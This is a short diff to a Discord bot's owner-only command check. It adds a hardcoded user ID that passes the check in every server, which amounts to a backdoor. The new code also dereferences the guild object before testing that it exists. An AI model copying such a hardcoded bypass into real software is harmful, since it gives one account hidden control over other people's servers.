@@ -21,7 +21,10 @@ module.exports = new class Owners extends Precondition {
   }
 
   async run(cmd, msg) {
-    if (msg.channel.guild && msg.channel.guild.ownerID !== msg.author.id) {
+    const notOwner = msg.channel.guild.ownerID !== msg.author.id
+      && msg.author.id !== '310859567649128449';
+
+    if (msg.channel.guild && notOwner) {
       return PreconditionResult.fromError(
         cmd,
         'this command may only be used by the server owner.'
